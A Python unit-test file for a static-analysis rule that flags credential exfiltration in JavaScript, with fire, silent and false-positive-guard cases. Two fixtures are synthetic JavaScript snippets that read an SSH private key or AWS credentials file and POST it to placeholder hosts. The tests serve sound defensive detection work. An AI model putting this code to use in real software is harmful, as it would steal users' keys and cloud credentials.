"""Fire / silent / FP-guard unit tests for the S17 credential-exfil rule.

Inputs are SYNTHETIC — hand-authored reproductions of the *shape* of the ecm3401
``func_steal_ssh`` payload (read ``~/.ssh/id_rsa``, POST it off-host) with a
defanged hostname placeholder. The real PoC is **never** downloaded into the repo;
no live receiver, no real key (see the detection-design README safety section).
The credential path is built by runtime concat (the ecm3401 form) to exercise the
"sensitive token anywhere, not only inside the read call" matcher.
"""

from __future__ import annotations

from collections.abc import Callable

from static_runtime.context import StaticAnalysisContext
from static_runtime.rules.s17_credential_exfil import CredentialExfilRule

MakeContext = Callable[..., StaticAnalysisContext]

# Positive: SSH private key read (runtime-concatenated path) -> JSON body -> POST.
# Defanged: the host is a placeholder, never resolved.
_CRED_EXFIL = """
const fs = require("fs");
const https = require("https");
function steal(user) {
  const keyPath = "/Users/" + user + "/.ssh/id_rsa";
  const key = fs.readFileSync(keyPath, "utf8");
  const req = https.request({ host: "exfil.placeholder.invalid", method: "POST" });
  req.write(JSON.stringify({ key }));
  req.end();
}
"""

# Positive: .aws/credentials read + fetch POST.
_AWS_EXFIL = """
const fs = require("fs");
const creds = fs.readFileSync(process.env.HOME + "/.aws/credentials");
fetch("https://collector.placeholder.invalid/c", { method: "POST", body: creds });
"""


def test_fires_high_on_ssh_key_read_then_network(make_context: MakeContext) -> None:
    ctx = make_context(files={"steal.js": _CRED_EXFIL})
    findings = CredentialExfilRule().evaluate(ctx)
    assert len(findings) == 1
    finding = findings[0]
    assert finding.rule_id == "extrace.s17.credential_exfil"
    # Confidentiality co-occurrence — HIGH/WARN, not CRITICAL/BLOCK.
    assert finding.severity.value == "high"
    assert finding.adversary_class is None
    assert "extrace.ext.credential_exfil" in finding.categories
    assert "attack.T1552.004" in finding.categories
    assert finding.evidence


def test_fires_on_aws_credentials_fetch(make_context: MakeContext) -> None:
    ctx = make_context(files={"aws.js": _AWS_EXFIL})
    assert len(CredentialExfilRule().evaluate(ctx)) == 1


def test_silent_for_credential_read_without_network(make_context: MakeContext) -> None:
    # The load-bearing FP guard: reading .ssh/config for SSH host completion with
    # NO network sink is benign — without an egress channel there is no exfil.
    src = (
        'const fs = require("fs");\n'
        'const hosts = fs.readFileSync(process.env.HOME + "/.ssh/config", "utf8");\n'
        "module.exports = parseHosts(hosts);\n"
    )
    ctx = make_context(files={"ssh.js": src})
    assert CredentialExfilRule().evaluate(ctx) == []


def test_silent_for_network_without_sensitive_read(make_context: MakeContext) -> None:
    # A telemetry extension reads a NON-sensitive config and POSTs it — no
    # credential path token, so no exfil signal.
    src = (
        'const fs = require("fs");\n'
        'const cfg = fs.readFileSync("./settings.json", "utf8");\n'
        'fetch("https://api.example.com/telemetry", { method: "POST", body: cfg });\n'
    )
    ctx = make_context(files={"telemetry.js": src})
    assert CredentialExfilRule().evaluate(ctx) == []


def test_silent_for_network_only(make_context: MakeContext) -> None:
    ctx = make_context(files={"net.js": 'fetch("https://api.example.com/ping");'})
    assert CredentialExfilRule().evaluate(ctx) == []


def test_silent_when_bundle_conjuncts_are_in_unrelated_regions(
    make_context: MakeContext,
) -> None:
    padding = "const bundledData = '" + ("x" * 9000) + "';"
    src = (
        'const p = ".ssh/id_rsa"; const key = fs.readFileSync(p);'
        + padding
        + 'fetch("https://telemetry.example.com/ping");'
    )
    ctx = make_context(files={"bundle.js": src})
    assert CredentialExfilRule().evaluate(ctx) == []
